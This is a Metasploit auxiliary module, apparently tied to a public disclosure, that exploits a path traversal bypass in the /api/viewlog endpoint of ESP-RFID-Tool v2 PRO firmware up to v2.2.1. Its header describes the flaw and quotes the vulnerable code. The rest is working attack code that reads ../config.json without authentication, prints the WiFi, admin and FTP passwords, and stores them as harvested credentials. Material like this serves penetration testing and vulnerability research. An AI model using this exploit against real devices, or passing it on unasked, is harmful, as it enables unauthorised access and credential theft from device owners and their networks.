##
# ESP-RFID-Tool v2 PRO — ESPR-03 v2
# Path Traversal Bypass — Arbitrary SPIFFS File Read (Config + Credential Dump)
#
# Researcher: qscXploit (dronin && rotzloeffel, original by t4c)
# Advisory:   https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt
# Affected:   ESP-RFID-Tool v2 PRO <= v2.2.1 (Bypass found in "fixed" v2)
#
# Description:
#   In firmware version v2.2.1, the vendor attempted to secure the device by 
#   restricting access to certain files and implementing basic path checks. 
#   However, the newly introduced API endpoint /api/viewlog remains critically 
#   vulnerable. 
#
#   The implementation of apilog() in api.h takes the logfile parameter, 
#   prepends a single slash (/), and passes the resulting string directly 
#   to SPIFFS.open(). It fails to perform any sanitization against directory 
#   traversal sequences (../). This allows an unauthenticated attacker to 
#   escape the logs directory and read any file on the SPIFFS filesystem.
#
#   The most critical target is /config.json (or /esprfidtool.json), which 
#   contains WiFi credentials and admin passwords in plaintext.
#
#   Vulnerable code (api.h):
#     void apilog(String logfile, int prettify) {
#       File f = SPIFFS.open(String()+"/"+logfile, "r"); 
#       ...
#     }
#
# Usage:
#   use auxiliary/gather/esp_rfid_v2_bypass
#   set RHOSTS [TARGET_IP]
#   set TARGET_FILE ../config.json
#   run
#



class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ESP-RFID-Tool v2 PRO Path Traversal Bypass',
      'Description'    => %q{
        Exploits a path traversal bypass in ESP-RFID-Tool v2 PRO <= v2.2.1.
        The /api/viewlog endpoint fails to sanitize 'logfile', allowing
        unauthenticated configuration exfiltration (credentials).
      },
      'Author'         => [ 'Milan t4c Berger', 'Rotzloeffel' ],
      'License'        => MSF_LICENSE,
      'References'     => [ ['URL', 'https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt'] ],
      'DisclosureDate' => '2026-05-19'
    ))

    register_options([
      OptString.new('TARGET_FILE', [true, 'File to read', '../config.json']),
      OptInt.new('RPORT', [true, 'Target port', 80])
    ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => '/api/viewlog',
      'vars_get' => { 'logfile' => datastore['TARGET_FILE'], 'prettify' => '1' }
    })

    if res && res.code == 200 && !res.body.empty? && !res.body.include?("Log file not found")
      print_good("#{ip} - Retrieved #{datastore['TARGET_FILE']}")
      store_loot("esp_rfid.config", "application/json", ip, res.body, datastore['TARGET_FILE'])
      parse_config(ip, res.body) if datastore['TARGET_FILE'].include?('config.json')
    else
      print_error("#{ip} - Failed. Patched or file missing.")
    end
  end

  def parse_config(ip, json)
    c = JSON.parse(json)
    print_good("#{ip} - Creds: WiFi:#{c['ssid']}:#{c['password']} Admin:#{c['update_username']}:#{c['update_password']}")
    report_cred(ip, c['update_username'], c['update_password'], 'http')
    report_cred(ip, c['ftp_username'], c['ftp_password'], 'ftp')
  rescue JSON::ParserError
    print_error("#{ip} - JSON Parse Error")
  end

  def report_cred(ip, user, pass, service)
    return if user.blank? || pass.blank?
    create_credential(
      address: ip, port: datastore['RPORT'], protocol: 'tcp',
      service_name: service, username: user, private_data: pass,
      private_type: :password, status: Metasploit::Model::Login::Status::UNTRIED
    )
  end
end

